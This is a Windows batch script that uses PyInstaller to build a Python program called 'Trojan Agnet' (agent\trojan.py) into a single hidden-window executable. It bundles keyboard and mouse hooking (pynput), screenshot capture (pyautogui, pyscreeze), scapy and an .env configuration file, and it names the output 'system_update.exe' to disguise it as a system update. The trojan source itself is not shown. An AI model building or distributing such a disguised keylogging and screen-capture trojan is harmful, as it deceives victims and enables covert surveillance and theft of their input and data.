@echo off
REM Windows Build Script for Trojan Agnet
REM Prerequisities: Python 3.x, pip
REM Run this on the Windows machine to build the .exe

echo [*] Installing Dependencies...
pip install -r requirements.txt
pip install pyinstaller Pillow

echo [*] Building Executable...
REM --noconsole: Hides the black window
REM --onefile: Single .exe
REM --add-data: Bundles the .env file (make sure .env is in agent/ folder)

pyinstaller --onefile ^
    --noconsole ^
    --hidden-import=pynput.keyboard._win32 ^
    --hidden-import=pynput.mouse._win32 ^
    --hidden-import=pynput.keyboard ^
    --hidden-import=pynput.mouse ^
    --hidden-import=pyautogui ^
    --hidden-import=pyscreeze ^
    --hidden-import=scapy.all ^
    --hidden-import=PIL ^
    --add-data "agent\.env;." ^
    --name system_update ^
    agent\trojan.py

echo [+] Build Complete. Check dist\system_update.exe
pause
